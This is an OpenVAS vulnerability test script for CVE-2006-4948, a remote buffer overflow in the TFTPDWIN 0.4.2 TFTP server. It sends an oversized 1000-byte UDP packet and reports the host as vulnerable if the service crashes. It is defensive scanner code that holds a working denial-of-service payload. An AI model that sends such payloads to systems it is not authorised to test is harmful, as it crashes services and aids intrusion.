###############################################################################
# OpenVAS Vulnerability Test
# $Id: ProSysInfo_tftpdwin_20131.nasl 5016 2017-01-17 09:06:21Z teissa $
#
# ProSysInfo TFTPDWIN Remote Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100265");
 script_version("$Revision: 5016 $");
 script_tag(name:"last_modification", value:"$Date: 2017-01-17 10:06:21 +0100 (Tue, 17 Jan 2017) $");
 script_tag(name:"creation_date", value:"2009-08-31 21:01:49 +0200 (Mon, 31 Aug 2009)");
 script_bugtraq_id(20131);
 script_cve_id("CVE-2006-4948");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("ProSysInfo TFTPDWIN Remote Buffer Overflow Vulnerability");

 script_category(ACT_DENIAL);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("tftpd_detect.nasl");
 script_require_udp_ports("Services/udp/tftp", 69);

 script_tag(name : "affected" , value : "TFTPDWIN 0.4.2 is vulnerable; other versions may be affected as well.");
 script_tag(name : "summary" , value : "TFTPDWIN server is prone to a remote buffer-overflow vulnerability
 because the application fails to properly bounds-check user-supplied
 input before copying it to an insufficiently sized memory buffer.");
 script_tag(name : "impact" , value : "An attacker may exploit this issue to execute arbitrary code in the
 context of the TFTP server process.");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/20131");
 script_xref(name : "URL" , value : "http://www.prosysinfo.com.pl/tftpserver/");

 script_tag(name:"qod_type", value:"exploit");

 exit(0);
}


include("tftp.inc");

if(safe_checks())exit(0);

port = get_kb_item('Services/udp/tftp');
if (! port) port = 69;
if (get_kb_item('tftp/'+port+'/backdoor')) exit(0);

if ( tftp_alive(port: port) ) {
  boom = crap(1000);
  soc = open_sock_udp(port);
  send(socket:soc, data:boom);
  sleep(1);
  close(soc);

  if(!tftp_alive(port: port)) {
     security_message(port:port,proto:"udp");
     exit(0);
  }
}

exit(99);
